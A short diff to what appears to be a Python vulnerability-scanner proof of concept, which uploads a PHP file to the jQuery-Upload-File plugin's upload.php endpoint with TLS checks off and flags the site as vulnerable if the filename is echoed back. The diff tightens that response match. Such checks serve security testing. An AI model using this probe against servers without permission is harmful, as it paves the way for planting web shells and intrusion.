@@ -36,7 +36,7 @@ def jquery_upload_file(url):
         vurl = urllib.parse.urljoin(url, 'jquery-upload-file/php/upload.php')
         print(vurl)
         req = requests.post(vurl, files=files, headers=headers, timeout=15, verify=False)
-        if "biubiubiu.php" in req.text:
+        if '["biubiubiu.php"]' in req.text:
             pocdict['isvul'] = True
             pocdict['vulnurl'] = vurl
             pocdict['response'] = req.text
